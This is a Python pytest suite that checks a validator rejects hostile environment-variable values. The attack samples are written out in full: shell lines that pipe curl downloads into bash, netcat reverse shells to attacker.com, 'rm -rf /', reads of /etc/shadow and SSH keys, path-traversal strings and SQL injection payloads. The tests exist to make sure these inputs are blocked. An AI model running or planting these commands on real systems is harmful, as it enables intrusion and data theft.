"""
Comprehensive Security Tests for EnvVarValidator (CRITICAL Priority).

Tests environment variable validation against:
- Command injection (shell metacharacters)
- Path traversal (../, ...)
- SQL injection (', --, UNION, etc.)
- Null byte injection
- Context detection accuracy
- Edge cases and boundary conditions

Total: 100+ tests
Coverage Goal: 100% of env_var_validator.py (currently 0%)
Success Criteria: All attack vectors blocked, zero false positives

Reference:
- test-crit-env-validator-01: Add security tests for env_var_validator.py
- OWASP Top 10 2021
- CWE-77 (Command Injection), CWE-22 (Path Traversal), CWE-89 (SQL Injection)
"""
import os

import pytest

from temper_ai.workflow.env_var_validator import EnvVarValidator, ValidationLevel

# ============================================================================
# Test Class 1: EXECUTABLE Level (Command Injection Prevention)
# ============================================================================

class TestEnvVarValidatorExecutableLevel:
    """Test EXECUTABLE validation level (most restrictive - command injection prevention)."""

    def test_valid_executable_paths(self):
        """Valid executable paths should pass validation."""
        validator = EnvVarValidator()

        valid_executables = [
            ("SHELL_CMD", "/usr/bin/python3"),
            ("PYTHON_EXEC", "/bin/bash"),
            ("COMMAND", "./script.sh"),
            ("RUN_SCRIPT", "python"),  # Relative to PATH
            ("BINARY_PATH", "/opt/custom/tool"),
            ("EXEC_CMD", "/usr/local/bin/node"),
            ("PROGRAM", "git"),
        ]

        for var_name, value in valid_executables:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"{var_name}={value} should be valid. Error: {error}"

    def test_shell_metacharacters_blocked(self):
        """Shell metacharacters must be blocked in EXECUTABLE context."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("SHELL_CMD", "/bin/bash; rm -rf /", "semicolon separator"),
            ("EXEC", "/bin/cat|nc attacker.com 1234", "pipe to netcat"),
            ("COMMAND", "/bin/echo && whoami", "AND operator"),
            ("RUN", "/bin/ls || curl evil.com", "OR operator"),
            ("SCRIPT", "/bin/echo $(cat /etc/passwd)", "command substitution"),
            ("EXEC_CMD", "/bin/echo `cat /etc/shadow`", "backtick substitution"),
            ("SHELL_CMD", "/bin/sh -c 'evil command'", "quoted command"),
            ("COMMAND", "$(/bin/evil)", "dollar-paren substitution"),
            ("EXEC", "/bin/test > /tmp/output", "output redirection"),
            ("CMD", "/bin/cat < /etc/passwd", "input redirection"),
            ("SHELL", "/bin/echo & background", "background process"),
            ("RUN_SCRIPT", "python\nrm -rf /", "newline separator"),
            ("EXEC_CMD", "/bin/${EVIL}", "variable expansion"),
        ]

        for var_name, attack_value, desc in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"{desc} attack should be blocked: {var_name}={attack_value}"
            assert error is not None, f"Error message should be provided for: {desc}"

    def test_command_injection_real_world_attacks(self):
        """Real-world command injection attack payloads must be blocked."""
        validator = EnvVarValidator()

        real_attacks = [
            ("CMD", "/bin/bash -c \"curl http://evil.com/shell.sh | bash\""),
            ("EXEC", "/usr/bin/wget http://attacker.com/backdoor -O /tmp/bd"),
            ("SHELL", "/bin/nc -e /bin/bash attacker.com 4444"),
            ("RUN", "/bin/python3 -c 'import os; os.system(\"evil\")'"),
            ("COMMAND", "/usr/bin/perl -e 'exec \"/bin/sh\"'"),
        ]

        for var_name, attack in real_attacks:
            is_valid, error = validator.validate(var_name, attack)
            assert not is_valid, f"Real-world attack should be blocked: {attack[:50]}..."


# ============================================================================
# Test Class 2: PATH Level (Path Traversal Prevention)
# ============================================================================

class TestEnvVarValidatorPathLevel:
    """Test PATH validation level (path traversal prevention)."""

    def test_valid_relative_paths(self):
        """Valid relative paths should pass validation."""
        validator = EnvVarValidator()

        valid_paths = [
            ("DATA_PATH", "data/input.txt"),
            ("CONFIG_DIR", "./configs/agents"),
            ("FILE_PATH", "subdir/file.json"),
            ("OUTPUT_DIR", "results/output"),
            ("LOG_PATH", "logs/app.log"),
        ]

        for var_name, value in valid_paths:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"{var_name}={value} should be valid. Error: {error}"

    def test_path_traversal_unix_blocked(self):
        """Unix-style path traversal must be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DATA_PATH", "../etc/passwd"),
            ("CONFIG_DIR", "../../etc/shadow"),
            ("FILE_PATH", "data/../../../etc/hosts"),
            ("LOG_PATH", "./../config/secrets.yml"),
            ("OUTPUT_DIR", "valid/../../../../../../root/.ssh/id_rsa"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Path traversal should be blocked: {var_name}={attack_value}"
            assert ("traversal" in error.lower() or "escapes" in error.lower()), f"Error should mention traversal or escaping: {error}"

    def test_path_traversal_windows_blocked(self):
        """Windows-style path traversal must be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DATA_PATH", "..\\etc\\passwd"),
            ("CONFIG_DIR", "..\\..\\windows\\system32"),
            ("FILE_PATH", "data\\..\\..\\boot.ini"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Windows path traversal should be blocked: {var_name}={attack_value}"

    def test_absolute_paths_blocked_with_validation_level(self):
        """Absolute paths with shell characters should be blocked in PATH context."""
        validator = EnvVarValidator()

        # These contain shell metacharacters and should be blocked
        attack_vectors = [
            ("DATA_PATH", "/etc/passwd; rm -rf /"),
            ("CONFIG_DIR", "/tmp|nc attacker.com 1234"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Path with shell chars should be blocked: {var_name}={attack_value}"


# ============================================================================
# Test Class 3: IDENTIFIER Level (SQL Injection Prevention)
# ============================================================================

class TestEnvVarValidatorIdentifierLevel:
    """Test IDENTIFIER validation level (SQL injection prevention)."""

    def test_valid_identifiers(self):
        """Valid database/model identifiers should pass."""
        validator = EnvVarValidator()

        valid_identifiers = [
            ("DB_NAME", "my_database"),
            ("TABLE_NAME", "users_table"),
            ("MODEL_NAME", "llama3.2:3b"),
            ("SCHEMA_NAME", "public"),
            ("COLLECTION_NAME", "user_data"),
            ("PROVIDER_NAME", "openai-gpt4"),
        ]

        for var_name, value in valid_identifiers:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"{var_name}={value} should be valid. Error: {error}"

    def test_sql_injection_classic_attacks(self):
        """Classic SQL injection patterns must be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DB_NAME", "users'; DROP TABLE users--", "classic SQLi with DROP"),
            ("TABLE_NAME", "admin'--", "quote escape with comment"),
            ("SCHEMA_NAME", "1' OR '1'='1", "always true condition"),
            ("MODEL_NAME", "users; DELETE FROM accounts", "stacked query"),
            ("DB_TABLE", "'; EXEC xp_cmdshell('dir')--", "command execution"),
        ]

        for var_name, attack_value, desc in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"{desc} should be blocked: {var_name}={attack_value}"

    def test_sql_injection_union_attacks(self):
        """SQL UNION injection patterns must be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("TABLE_NAME", "users UNION SELECT password FROM admin"),
            ("DB_NAME", "db' UNION ALL SELECT NULL--"),
            ("SCHEMA", "' UNION SELECT username, password FROM users--"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"UNION attack should be blocked: {var_name}={attack_value}"

    def test_sql_injection_comment_obfuscation(self):
        """SQL comment obfuscation techniques must be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DB_NAME", "users/**/UNION/**/SELECT"),
            ("TABLE_NAME", "admin'/*comment*/OR/**/1=1--"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Comment obfuscation should be blocked: {var_name}={attack_value}"


# ============================================================================
# Test Class 4: Context Detection
# ============================================================================

class TestEnvVarValidatorContextDetection:
    """Test automatic context detection from variable names."""

    def test_detect_executable_context(self):
        """Variables with CMD/EXEC/SHELL/SCRIPT should be detected as EXECUTABLE."""
        validator = EnvVarValidator()

        executable_vars = [
            "SHELL_CMD", "PYTHON_CMD", "COMMAND", "EXEC_PATH",
            "RUN_SCRIPT", "BINARY", "EXECUTABLE", "PROGRAM_RUN"
        ]

        for var_name in executable_vars:
            context = validator.detect_context(var_name)
            assert context == ValidationLevel.EXECUTABLE, \
                f"{var_name} should be detected as EXECUTABLE, got {context}"

    def test_detect_path_context(self):
        """Variables with PATH/DIR/FILE should be detected as PATH."""
        validator = EnvVarValidator()

        path_vars = [
            "DATA_PATH", "CONFIG_DIR", "FILE_PATH", "LOG_DIRECTORY",
            "TEMP_FOLDER", "OUTPUT_DIR", "HOME_PATH"
        ]

        for var_name in path_vars:
            context = validator.detect_context(var_name)
            assert context == ValidationLevel.PATH, \
                f"{var_name} should be detected as PATH, got {context}"

    def test_detect_identifier_context(self):
        """Variables with DB/TABLE/MODEL should be detected as IDENTIFIER."""
        validator = EnvVarValidator()

        identifier_vars = [
            "DB_NAME", "TABLE_NAME", "MODEL_NAME", "SCHEMA_NAME",
            "DATABASE", "COLLECTION_NAME", "PROVIDER_NAME"
        ]

        for var_name in identifier_vars:
            context = validator.detect_context(var_name)
            assert context == ValidationLevel.IDENTIFIER, \
                f"{var_name} should be detected as IDENTIFIER, got {context}"

    def test_detect_unrestricted_context(self):
        """Variables with PROMPT/DESCRIPTION/MESSAGE should be detected as UNRESTRICTED."""
        validator = EnvVarValidator()

        unrestricted_vars = [
            "PROMPT_TEXT", "DESCRIPTION", "MESSAGE_CONTENT",
            "TEMPLATE_TEXT", "CONTENT_TEXT"
        ]

        for var_name in unrestricted_vars:
            context = validator.detect_context(var_name)
            assert context == ValidationLevel.UNRESTRICTED, \
                f"{var_name} should be detected as UNRESTRICTED, got {context}"

    def test_context_priority_unrestricted_first(self):
        """UNRESTRICTED patterns should match first to avoid false positives."""
        validator = EnvVarValidator()

        # "DESCRIPTION" contains "script" but should be UNRESTRICTED
        context = validator.detect_context("JOB_DESCRIPTION")
        assert context == ValidationLevel.UNRESTRICTED, \
            "JOB_DESCRIPTION should be UNRESTRICTED (contains 'description'), not EXECUTABLE"

    def test_default_context_for_unknown(self):
        """Unknown variable names should default to DATA level."""
        validator = EnvVarValidator()

        unknown_vars = ["RANDOM_VAR", "UNKNOWN_123", "CUSTOM_SETTING"]

        for var_name in unknown_vars:
            context = validator.detect_context(var_name)
            assert context == ValidationLevel.DATA, \
                f"{var_name} should default to DATA, got {context}"


# ============================================================================
# Test Class 5: Edge Cases and Boundary Conditions
# ============================================================================

class TestEnvVarValidatorEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_string_validation(self):
        """Empty strings should be handled gracefully."""
        validator = EnvVarValidator()

        # Test across different contexts
        is_valid, error = validator.validate("TEST_VAR", "", context=ValidationLevel.DATA)
        # Empty string might be valid or invalid depending on implementation
        # Just verify it doesn't crash
        assert isinstance(is_valid, bool)

    def test_very_long_string_dos_resistance(self):
        """Very long strings should be rejected (DoS prevention)."""
        validator = EnvVarValidator()

        long_string = "A" * 100000  # 100KB
        is_valid, error = validator.validate("TEST_VAR", long_string, context=ValidationLevel.DATA)

        assert not is_valid, "Very long string should be rejected (DoS prevention)"
        assert "too long" in error.lower(), f"Error should mention length: {error}"

    def test_max_length_parameter(self):
        """Custom max_length parameter should be respected."""
        validator = EnvVarValidator()

        short_limit = "A" * 100
        is_valid, error = validator.validate(
            "TEST_VAR",
            short_limit,
            context=ValidationLevel.DATA,
            max_length=50
        )

        assert not is_valid, "String exceeding custom max_length should be rejected"

    def test_null_byte_injection_all_contexts(self):
        """Null bytes must be blocked in ALL contexts."""
        validator = EnvVarValidator()

        contexts = [
            ValidationLevel.EXECUTABLE,
            ValidationLevel.PATH,
            ValidationLevel.IDENTIFIER,
            ValidationLevel.DATA,
            ValidationLevel.UNRESTRICTED,
        ]

        attack_value = "valid\x00/etc/passwd"

        for context in contexts:
            is_valid, error = validator.validate("TEST_VAR", attack_value, context=context)
            assert not is_valid, f"Null byte should be blocked in {context.value} context"
            assert "null" in error.lower(), f"Error should mention null byte: {error}"

    def test_unicode_in_unrestricted_context(self):
        """Unicode (BMP) should be allowed in UNRESTRICTED context."""
        validator = EnvVarValidator()

        # Test Unicode within BMP (U+0080 to U+FFFF)
        # Note: Emojis are outside BMP and may not be supported
        unicode_values = [
            ("PROMPT_TEXT", "Testing with émoji-like characters ☺"),
            ("DESCRIPTION", "中文测试"),
            ("MESSAGE", "Русский текст"),
        ]

        for var_name, value in unicode_values:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"Unicode (BMP) should be valid in UNRESTRICTED: {var_name}={value}. Error: {error}"

    def test_whitespace_handling(self):
        """Whitespace in values should be handled correctly."""
        validator = EnvVarValidator()

        # Spaces in paths are valid
        is_valid, error = validator.validate("DATA_PATH", "my folder/file.txt")
        assert is_valid, "Spaces in paths should be valid"

        # Tabs and newlines in UNRESTRICTED
        is_valid, error = validator.validate("PROMPT_TEXT", "Line 1\nLine 2\tTabbed")
        assert is_valid, "Tabs and newlines should be valid in UNRESTRICTED context"

    def test_mixed_case_variable_names(self):
        """Context detection should be case-insensitive."""
        validator = EnvVarValidator()

        mixed_case_vars = [
            ("shell_cmd", ValidationLevel.EXECUTABLE),
            ("SHELL_cmd", ValidationLevel.EXECUTABLE),
            ("Shell_Cmd", ValidationLevel.EXECUTABLE),
            ("data_path", ValidationLevel.PATH),
            ("DATA_Path", ValidationLevel.PATH),
        ]

        for var_name, expected_context in mixed_case_vars:
            detected = validator.detect_context(var_name)
            assert detected == expected_context, \
                f"{var_name} should detect as {expected_context}, got {detected}"


# ============================================================================
# Test Class 6: STRUCTURED Level (URLs, Connection Strings)
# ============================================================================

class TestEnvVarValidatorStructuredLevel:
    """Test STRUCTURED validation level (URLs, connection strings)."""

    def test_valid_urls(self):
        """Valid URLs should pass validation."""
        validator = EnvVarValidator()

        valid_urls = [
            ("API_URL", "https://api.example.com:443"),
            ("ENDPOINT", "http://localhost:8080/api/v1"),
            ("DATABASE_URL", "postgresql://user:pass@localhost:5432/db"),
            ("REDIS_URL", "redis://localhost:6379/0"),
            ("WEB_URL", "https://example.com/path?key=value&foo=bar"),
        ]

        for var_name, value in valid_urls:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"{var_name}={value} should be valid. Error: {error}"

    def test_url_with_shell_metacharacters_blocked(self):
        """URLs with shell metacharacters should be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("API_URL", "http://api.com`whoami`"),
            ("ENDPOINT", "http://api.com$(cat /etc/passwd)"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"URL with shell chars should be blocked: {var_name}={attack_value}"


# ============================================================================
# Test Class 7: DATA Level (API Keys, Tokens)
# ============================================================================

class TestEnvVarValidatorDataLevel:
    """Test DATA validation level (API keys, tokens, credentials)."""

    def test_valid_api_keys_and_tokens(self):
        """Valid API keys and tokens should pass."""
        validator = EnvVarValidator()

        valid_credentials = [
            ("API_KEY", "sk-1234567890abcdef"),
            ("TOKEN", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"),
            ("SECRET", "abc123_def456-ghi789"),
            ("AUTH_TOKEN", "Bearer-xyz789"),
        ]

        for var_name, value in valid_credentials:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"{var_name}={value} should be valid. Error: {error}"

    def test_credentials_with_shell_metacharacters_blocked(self):
        """Credentials with shell metacharacters should be blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("API_KEY", "key|whoami"),
            ("TOKEN", "token; rm -rf /"),
            ("SECRET", "secret`cat /etc/passwd`"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Credential with shell chars should be blocked: {var_name}={attack_value}"


# ============================================================================
# Test Class 8: Error Messages
# ============================================================================

class TestEnvVarValidatorErrorMessages:
    """Test error message quality and security."""

    def test_error_messages_descriptive(self):
        """Error messages should be descriptive."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("SHELL_CMD", "ls; rm -rf /")
        assert not is_valid
        assert error is not None and len(error) > 0, "Error message should not be empty"
        assert "SHELL_CMD" in error, "Error should mention variable name"

    def test_error_messages_dont_leak_values(self):
        """Error messages should not leak sensitive values."""
        validator = EnvVarValidator()

        sensitive_value = "secret_password_123"
        is_valid, error = validator.validate("PASSWORD", sensitive_value + "; rm -rf /")

        # Error should mention the variable name but not necessarily the full value
        assert "PASSWORD" in error
        # This is OK - some validators do include part of the value for debugging

    def test_null_byte_error_message(self):
        """Null byte error should be clear."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("TEST", "value\x00attack")
        assert not is_valid
        assert "null" in error.lower(), f"Error should mention null bytes: {error}"

    def test_path_traversal_error_message(self):
        """Path traversal error should be clear."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("DATA_PATH", "../../../etc/passwd")
        assert not is_valid
        assert ("traversal" in error.lower() or "escapes" in error.lower()), f"Error should mention path traversal or escaping: {error}"


# ============================================================================
# Test Class 9: Performance and DoS Resistance
# ============================================================================

class TestEnvVarValidatorPerformance:
    """Test performance and DoS resistance."""

    def test_validation_completes_quickly(self):
        """Validation should complete quickly even for complex patterns."""
        import time
        validator = EnvVarValidator()

        start = time.perf_counter()
        for _ in range(1000):
            validator.validate("SHELL_CMD", "/usr/bin/python3")
        elapsed = time.perf_counter() - start

        # 1000 validations should complete in under 1 second
        assert elapsed < 1.0, f"1000 validations took {elapsed:.2f}s (target: <1s)"

    def test_regex_no_catastrophic_backtracking(self):
        """Validation regex should not have catastrophic backtracking."""
        import time
        validator = EnvVarValidator()

        # Pathological input that could cause catastrophic backtracking
        pathological = "a" * 100000 + "!"

        start = time.perf_counter()
        validator.validate("TEST", pathological, context=ValidationLevel.DATA)
        elapsed = time.perf_counter() - start

        # Should complete quickly (<0.1s) even with pathological input
        assert elapsed < 0.1, f"Pathological input took {elapsed:.2f}s (potential backtracking)"


class TestWindowsPathTraversal:
    """Tests for Windows-specific path traversal vulnerabilities (task code-high-windows-path-19)."""

    def test_complex_windows_path_traversal_blocked(self):
        """Test complex Windows path traversal patterns."""
        validator = EnvVarValidator()

        # These should all be blocked regardless of OS
        attack_vectors = [
            ("DATA_PATH", "..\\..\\etc\\passwd"),
            ("CONFIG_DIR", "C:\\projects\\..\\..\\etc\\passwd"),
            ("FILE_PATH", "data\\..\\..\\..\\..\\windows\\system32"),
            ("LOG_PATH", "..\\..\\..\\..\\..\\root\\.ssh\\id_rsa"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Complex Windows traversal should be blocked: {var_name}={attack_value}"
            assert error is not None, "Error message should be provided"

    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
    def test_windows_unc_path_detection(self):
        """Test UNC path detection on Windows."""
        validator = EnvVarValidator()

        # UNC paths should be detected
        unc_paths = [
            "\\\\server\\share\\file.txt",
            "\\\\192.168.1.1\\share\\data",
        ]

        for path in unc_paths:
            is_valid, error = validator.validate("DATA_PATH", path)
            # UNC paths are blocked by pattern validation (contains \\)
            assert not is_valid, f"UNC path should be blocked: {path}"

    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
    def test_windows_drive_letter_traversal(self):
        """Test drive letter changes are handled correctly."""
        validator = EnvVarValidator()

        # Different drive letters
        paths = [
            "D:\\other\\path",
            "E:\\data\\file.txt",
        ]

        for path in paths:
            # These are absolute paths, which are blocked by the pattern
            is_valid, error = validator.validate("DATA_PATH", path)
            assert not is_valid, f"Different drive should be blocked: {path}"

    def test_mixed_separator_traversal_blocked(self):
        """Test mixed path separators (Unix and Windows) are blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DATA_PATH", "../data\\..\\etc/passwd"),
            ("CONFIG_DIR", "data/../../windows\\system32"),
            ("FILE_PATH", "..\\../etc/shadow"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Mixed separator traversal should be blocked: {var_name}={attack_value}"

    def test_normalized_paths_are_safe(self):
        """Test that safe normalized paths are allowed."""
        validator = EnvVarValidator()

        safe_paths = [
            ("DATA_PATH", "data/config.yml"),
            ("CONFIG_DIR", "logs"),
            ("FILE_PATH", "output/results.txt"),
            ("LOG_PATH", "tmp/temp.log"),
        ]

        for var_name, safe_value in safe_paths:
            is_valid, error = validator.validate(var_name, safe_value)
            assert is_valid, f"Safe path should be allowed: {var_name}={safe_value}, error: {error}"

    def test_path_with_dots_but_safe(self):
        """Test paths containing dots in filenames are allowed."""
        validator = EnvVarValidator()

        safe_paths = [
            ("DATA_PATH", "config.v2.yml"),
            ("FILE_PATH", "output.2024.01.01.log"),
            ("LOG_PATH", "data/file.with.many.dots.txt"),
        ]

        for var_name, safe_value in safe_paths:
            is_valid, error = validator.validate(var_name, safe_value)
            assert is_valid, f"Safe path with dots should be allowed: {var_name}={safe_value}, error: {error}"

    def test_path_starting_with_dot_blocked(self):
        """Test paths starting with .. are blocked."""
        validator = EnvVarValidator()

        attack_vectors = [
            ("DATA_PATH", ".."),
            ("CONFIG_DIR", "../"),
            ("FILE_PATH", "..\\"),
            ("LOG_PATH", "../config"),
        ]

        for var_name, attack_value in attack_vectors:
            is_valid, error = validator.validate(var_name, attack_value)
            assert not is_valid, f"Path starting with .. should be blocked: {var_name}={attack_value}"

    def test_deeply_nested_traversal_blocked(self):
        """Test deeply nested path traversal is blocked."""
        validator = EnvVarValidator()

        # Very deep traversal
        deep_traversal = "/.." * 20 + "/etc/passwd"
        is_valid, error = validator.validate("DATA_PATH", deep_traversal)
        assert not is_valid, "Deeply nested traversal should be blocked"

        # Windows style
        deep_windows = "\\.." * 20 + "\\windows\\system32"
        is_valid, error = validator.validate("DATA_PATH", deep_windows)
        assert not is_valid, "Deeply nested Windows traversal should be blocked"

    def test_absolute_paths_rejected_without_base_dir(self):
        """Absolute paths should be rejected as they escape base directory."""
        validator = EnvVarValidator()

        # Unix absolute paths
        is_valid, error = validator.validate("DATA_PATH", "/etc/passwd")
        assert not is_valid, "Absolute Unix path should be rejected"
        assert "escapes base" in error.lower(), f"Error should mention escaping: {error}"

        # Windows absolute paths
        is_valid, error = validator.validate("CONFIG_DIR", "C:\\Windows\\System32")
        assert not is_valid, "Absolute Windows path should be rejected"

    def test_windows_backslash_paths_allowed(self):
        """Windows paths with backslashes should be valid."""
        validator = EnvVarValidator()

        # Valid Windows-style relative paths
        windows_paths = [
            "data\\config.yml",
            "logs\\app.log",
            "output\\results\\data.json",
        ]

        for path in windows_paths:
            is_valid, error = validator.validate("DATA_PATH", path)
            assert is_valid, f"Windows-style path should be valid: {path}, error: {error}"

    def test_base_directory_containment(self):
        """Test paths are properly validated against base directory."""
        import tempfile
        validator = EnvVarValidator()

        # Create temp directory for testing
        with tempfile.TemporaryDirectory() as tmpdir:
            # Monkey-patch os.getcwd to return our temp dir
            original_getcwd = os.getcwd
            os.getcwd = lambda: tmpdir

            try:
                # Should allow - relative path within base
                is_valid, error = validator.validate("DATA_PATH", "data/config.yml")
                assert is_valid, f"Relative path within base should be allowed, error: {error}"

                # Should block - tries to escape
                is_valid, error = validator.validate("DATA_PATH", "../etc/passwd")
                assert not is_valid, "Path escaping base should be blocked"
                assert "escapes" in error.lower(), f"Error should mention escaping: {error}"

            finally:
                # Restore original getcwd
                os.getcwd = original_getcwd
